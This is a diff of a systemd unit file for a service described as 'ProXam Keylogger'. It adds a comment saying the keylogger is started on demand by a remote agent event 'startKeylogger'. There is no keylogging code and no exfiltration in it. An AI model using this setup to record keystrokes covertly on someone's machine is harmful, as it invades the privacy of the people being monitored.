@@ -1,5 +1,5 @@
 [Unit]
-Description=keylogger
+Description=ProXam Keylogger (on-demand via SSE event)
 
 [Service]
 Type=simple
@@ -9,5 +9,6 @@ ExecStopPost=/usr/bin/launch keylogger
 Restart=on-failure
 RestartSec=5s
 
+# Not enabled by default — started via agent event "startKeylogger"
 [Install]
 WantedBy=graphical.target
